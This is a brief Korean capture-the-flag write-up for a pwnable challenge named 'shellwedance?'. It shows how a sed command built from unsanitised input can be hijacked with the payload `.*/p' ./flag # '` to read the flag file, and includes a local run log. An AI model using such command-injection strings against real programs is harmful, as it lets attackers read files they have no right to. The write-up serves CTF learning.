## No.26 Pwnable shellwedance?[300]

**점수:** 300

**분야:** Pwnable

**제목:** shellwedance?

**Description:**

> I'm looking at BigData. That's all
> 
> nc 223.194.105.182 48702
> Download : https://goo.gl/pH02H1

바이너리를 실행시켜보면 크게 `sed`와 `awk`의 인자를 입력할 수 있다. 

여기서 커맨드 인젝션이 가능한데 `awk`은 입력값에 대한 검사를 하기 때문에 검사가 없는 `sed`를 이용하여 공격한다.
 
2번 메뉴를 통해 공격하며 명령어 입력은 `sed '/%s/p' ./yeast.data` 의 형태로 받기 때문에 `.*/p' ./flag # '` 를 입력하면 아래와 같이 `flag` 파일을 읽을 수 있다.
 
대회 당시 미처 자료를 준비하지 못하여 로컬에서 공격한 기록을 남긴다.

```
Hello :D - Learning Data Parser
--------------------------
flag
shellwedance
--------------------------
 
select option
1. original data
2. sed(include)
3. sed(exclude)
4. sed&awk(conditional)
5. sed&awk(average)
6. awk(pattern&action)
7. exit
2
sed - Include Keyword:
.*/p' ./flag #'
sed -n '/.*/p' ./flag #'/p' ./yeast.data
THIS IS THE FLAG
```
